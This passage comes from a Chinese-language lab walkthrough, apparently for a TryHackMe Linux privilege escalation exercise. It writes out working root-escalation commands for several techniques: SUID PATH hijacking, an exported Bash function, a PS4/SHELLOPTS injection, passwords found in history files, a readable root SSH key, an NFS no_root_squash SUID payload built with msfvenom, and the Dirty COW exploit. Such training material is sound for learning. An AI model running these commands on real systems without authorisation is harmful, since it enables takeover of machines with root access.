将当前工作目录(或新的service可执行文件所在的目录)前置添加到PATH 变量中，并同时执行/usr/local/bin/suid-env，成功获得 root shell:：

```shell
PATH=.:$PATH /usr/local/bin/suid-env
#这个命令前半部分会在PATH变量值的开头部分添加一个路径, " . "表示当前工作目录的路径
#这个命令的后半部分会执行/usr/local/bin/suid-env文件，该文件执行时会找到当前工作目录下的伪造service文件并执行它
```

![image-20221011015237229](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011015237229.png)

## SUID/SGID 可执行文件提权-滥用 Shell 特性(# 1)

SUID可执行文件/usr/local/bin/suid-env2与上一小节的/usr/local/bin/suid-env 功能相同，只是它使用service可执行文件(/usr/sbin/service)的绝对路径来启动 apache2 Web 服务器。

![image-20221011193848967](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011193848967.png)

查看suid-env2文件内容中的字符串以验证其功能:

```shell
strings /usr/local/bin/suid-env2
```

![image-20221011193930661](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011193930661.png)

在 Bash 版本 < 4.2-048中，可以定义名称类似于文件路径的shell 函数（将文件路径当做函数名），然后导出函数，以便在该文件路径中使用它，而不是使用其他任何实际的可执行文件。

验证安装在目标机上的 Bash 版本是否小于4.2-048:

```shell
/bin/bash --version
```

![image-20221011194025350](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011194025350.png)

创建一个 shell函数，名称为"/usr/sbin/service"(创建函数，顶替真实路径)，作用是执行一个新的 Bash shell(使用-p 保留权限)，然后导出这个函数:

```shell
function /usr/sbin/service { /bin/bash -p; }  #创建函数，函数名为 "/usr/sbin/service"
export -f /usr/sbin/service                   #导出函数
```

运行SUID可执行文件suid-env2以获得root shell:

```shell
/usr/local/bin/suid-env2
```

![image-20221011194308225](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011194308225.png)

## SUID/SGID 可执行文件提权-滥用 Shell 特性(# 2)

4.4版本之前的Bash shell允许本地用户通过精心设计的SHELLOPTS 和 PS4环境变量执行具有 root 权限的任意命令（通过SUID可执行文件来赋予命令root权限）。

相关的cve链接：https://www.cvedetails.com/cve/CVE-2016-7543/

注意: 这不适用于4.4及以上版本的 Bash。

在调试（debugging ）模式下，Bash可以使用环境变量 PS4来显示调试语句的额外提示（我们可以利用这个额外提示，来执行任意命令）。

在启用 bash 调试的情况下运行SUID可执行文件/usr/local/bin/SUID-env2，并将 PS4变量设置为一个嵌入式命令，该命令的作用是创建/bin/bash 的 SUID 版本:

```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
#Bash具有调试模式，可通过–x命令行选项开启，或者通过修改SHELLOPTS环境变量让它包括xtrace---以此启用调试模式
```

![image-20221011204256049](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011204256049.png)

在上一行命令执行成功后，会生成一个SUID版本的/bin/bash文件（也就是/tmp/rootbash），使用-p 运行这个/tmp/rootbash 可执行文件，以获得使用 root 权限运行的 shell：

```shell
/tmp/rootbash -p
```

![image-20221011204325765](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011204325765.png)

完成验证之后，删除/tmp/rootbash 可执行文件并退出升级后的 shell：

```shell
rm /tmp/rootbash
exit
```

## 密码及密钥-利用历史文件提权

如果用户不小心在命令行而不是密码提示符中键入了密码，那么它可能会被记录在历史文件中。

查看用户主目录中所有隐藏历史文件的内容:

```shell
cat ~/.*history | less
#less命令规定了输出结果的格式，浏览时支持向前和向后翻看
#使用ZZ退出 less 命令。
```

![image-20221011205024134](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011205024134.png)

从历史记录中，我们能看到用户在某个时刻尝试使用“ root”用户名和通过命令行提交的密码来连接到 MySQL 服务器，注意：图中的-p 选项和密码之间没有空格！

我们切换到 root 用户，使用在历史记录中看到的密码登录:

```shell
su root
```

![image-20221011205632580](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011205632580.png)

## 密码和密钥-利用配置文件提权

配置文件通常可能包含明文或其他可逆格式的密码。

列出用户主目录的内容:

```shell
ls /home/user
```

我们注意到用户主目录下有一个 myvpn.ovpn 配置文件，查看其内容:

```
cat /home/user/myvpn.ovpn
```

该文件的内容包含了可以找到root用户登录凭据的其他位置的引用，去对应位置找到登录凭据，使用凭据登录 root 用户:

![image-20221011210401094](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011210401094.png)

**答题卡：**

![image-20221011210500149](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011210500149.png)

## 密码和密钥-利用SSH密钥提权

如果私钥权限设置错误，这个私钥就很容易被利用。

有时，用户会备份重要文件，但可能没有使用正确的权限去保护它们，尝试在目标机的系统根目录中查找隐藏的文件和目录:

```shell
ls -la /
```

![image-20221011185850037](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011185850037.png)

注意，目标系统的根目录下似乎有一个名为.ssh 的隐藏目录，这个目录对其他用户可读，我们使用命令来查看.ssh目录的内容：

```shell
ls -l /.ssh
```

![image-20221011190034201](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011190034201.png)

![image-20221011190303413](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011190303413.png)

我们发现了一个名为 root\_key 的全用户可读文件，进一步检查这个文件发现它可能是一个私有 SSH 密钥，文件的名称也暗示了 它可能是为 root 用户设置的。

现在，把这个密钥复制到你的 Kali 里面（只需查看root\_key文件的内容并复制、粘贴密钥即可）并给予它正确的权限，否则你的 SSH 客户端将拒绝使用它:

```shell
chmod 600 root_key #仅文件所有者可读可写
```

![image-20221011190603257](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011190603257.png)

接下来，使用该密钥并作为目标机的root 帐户-----用攻击机远程登录到目标机:

```shell
#ssh -i root_key root@MACHINE_IP 
ssh -i root_key root@10.10.83.196    #指定目标机ip
```

如果我们是用自己的kali机作为攻击机，那么上面那条命令将无法成功执行。因为我们的kali是通过OpenSSH连接到TryHackMe平台的内网，而OpenSSH 已经不支持 ssh-rsa。

我们通过以下步骤解决这个问题：

```
1.保证攻击机上的root_key权限为600

2.cd ~/.ssh目录下

3.创建文件config，内容为：PubkeyAcceptedKeyTypes +ssh-rsa ，保存并退出。

4.在kali机上打开一个新的终端窗口，输入： ssh -i root_key root@10.10.83.196 -oHostKeyAlgorithms=+ssh-rsa
```

![image-20221011193506594](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011193506594.png)

![image-20221011193542292](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011193542292.png)

## NFS提权

通过 NFS 创建的文件会继承远程用户的 ID。

现在我们通过NFS创建一个文件（该文件是客户机和服务机共享的），把攻击机用户作为远程用户（客户机），如果攻击机用户是 root，有以下两种情况：

1.目标机（服务机）上启用了root\_squash选项，则文件的用户ID 在服务机上将被设置为“ nobody”用户，具有最少的本地特权；

2.目标机（服务机）上启用了no\_root\_squash选项，则文件的用户ID 在服务机上将被设置为root。

检查目标机上的 NFS 共享配置:

```shell
cat /etc/exports
```

关于/etc/exports文件：

```shell
/etc/exports文件包含了将哪些文件夹（目录）/文件系统导出到远程用户的配置和权限。

这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成
[共享的目录] [主机名或IP(参数,参数)]

其中参数是可选的，当不指定参数时，nfs将使用默认选项------默认的共享选项是 sync,ro,root_squash,no_delay。
当主机名或IP地址为空时，则代表共享能给任意客户机提供服务。
当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样设置：
[共享的目录] [主机名1或IP1(参数1,参数2)] [主机名2或IP2(参数3,参数4)]
#上面说的客户机是远程用户，带有NFS共享配置文件的机器是服务机（客户机和服务机是一组相对的概念）
```

![image-20221011183113869](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011183113869.png)

我们可以看到/tmp目录是可共享的，远程用户可以挂载它，并且/tmp目录共享还禁用了root\_squash选项（启用no\_root\_squash选项-----即代表禁用了root\_squash）。

在攻击机上先切换到root用户。

```shell
sudo su
```

使用攻击机的root用户，在攻击机上创建一个挂载点并挂载目标机的/tmp 共享目录:

```shell
mkdir /tmp/nfs                                   #创建一个挂载点
mount -o rw,vers=3 10.10.83.196:/tmp /tmp/nfs    #挂载目标机（nfs服务机）的/tmp共享目录，此处可能因为版本问题失败-----修改版本号即可

#如果攻击机没有安装NFS，需要先用以下命令安装：
#sudo apt install nfs-common
#apt-get install cifs-utils
```

![image-20221011184026136](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011184026136.png)

继续使用攻击机的root用户，通过msfvenom生成一个payload并将其保存到 刚才挂载的共享目录（这个payload的作用是调用/bin/bash）

```shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

仍然使用攻击机的 root 用户，使刚才的payload文件可执行并设置 SUID 权限:

```shell
chmod +xs /tmp/nfs/shell.elf
```

![image-20221011184111588](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011184111588.png)

在目标机上操作（通过ssh登陆之后的界面），作为目标机上的低权限用户帐户，执行共享目录下的文件以获得 root shell:

```shell
/tmp/shell.elf
```

![image-20221011183839029](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011183839029.png)

**答题卡**

![image-20221011173153434](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011173153434.png)

## 内核漏洞exp提权

内核漏洞利用是权限提升的最后一招，内核漏洞利用（exp）可能会使系统处于不稳定状态，这就是为什么只有在万不得已的情况下才应该运行它们。

有许多工具可用于识别当前内核版本中的可利用漏洞：

> https://github.com/mzet-/linux-exploit-suggester
>
> https://github.com/jondonas/linux-exploit-suggester-2

运行**Linux Exploit Suggester 2**工具，来识别当前系统上潜在的可利用内核漏洞（它运行在目标系统上，如果目标系统上没有这个工具，就要下载或者上传一个）:

```shell
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
#上条命令可以后跟参数，如：-k 2.6.32 （将会查找版本为2.6.32的linux系统内核漏洞exp）
```

![image-20221011184420060](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011184420060.png)

观察以上命令的输出结果，我们可以看到目标系统存在一个非常流行的Linux内核漏洞"Dirty COW"（脏牛），我们接下来利用这个漏洞的exp来提权。

> exp全称：Linux 内核2.6.22 < 3.9(x86/x64)- 'Dirty COWCOW/proc/self/mem' 竞争条件权限提升(SUID 方法)
>
> exp链接：https://www.exploit-db.com/exploits/40616

在目标机上创建c0w.c文件-----该文件的内容为"Dirty COW"的exp代码；也可以将exp文件放置在攻击机上，然后攻击机使用python3开启HTTP服务，目标机通过wget下载c0w.c文件。

执行这个exp会将SUID文件/usr/bin/passwd替换为 生成shell的文件（从外在看不出变化），我们先备份/usr/bin/passwd到/tmp/bak：

```shell
cp /usr/bin/passwd /tmp/bak  #执行脏牛exp时，也可能会自动备份/usr/bin/passwd
```

编译c0w.c文件，将编译结果输出为一个可执行文件c0w，然后我们执行c0w：

```shell
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

一旦exp执行完毕，我们就去运行/usr/bin/passwd文件，最后得到一个root权限的shell：

```shell
/usr/bin/passwd
```

![image-20221011185606043](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011185606043.png)

完成验证后，记得恢复原始的/usr/bin/passwd 文件并退出root shell：

```shell
mv /tmp/bak /usr/bin/passwd
exit
```

## 权限提升检测脚本

已经有一些工具能够帮助找到 Linux 上潜在的权限升级漏洞，其中三个工具已经包含在目标机的以下目录中:/home/user/tools/privesc-scripts

尝试使用这三种工具（推荐使用第二个脚本）。

> LinEnum：https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
>
> linpeas.sh（推荐）：https://github.com/carlospolop/PEASS-ng/releases/tag/20221009
>
> lse.sh：https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
>
> Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
>
> 权限提升资料：https://0xsanz.medium.com/70-ways-to-get-root-linux-privilege-escalation-d98ec78f1405

![image-20221010234410706](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010234410706.png)

![image-20221010234842087](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010234842087.png)

![image-20221010235822873](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221010235822873.png)

![image-20221011000122104](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221011000122104.png)

## 总结

前期：

1. 进行简单信息收集(id, whoami)；
2. 运行Linux Smart Enumeration等提权检测脚本；
3. 运行LinEnum和其他脚本-----枚举系统信息。

使用" ls -la "快速查找home中的文件、目录和其他公共位置(例如/var，/backup，/var/logs以及根目录/)；

注意：如果用户有一个历史文件，它可能有重要的信息，比如命令或者密码；

查看以root权限运行的服务，如：MySQL数据库；

查看/etc/passwd文件和/etc/shadow文件的权限分配情况-----普通用户是否能够进行读写操作；

查看Sudo，Cron jobs，SUID/SGID文件；

查看NFS配置是否存在错误；

最后考虑内核漏洞exp提权；
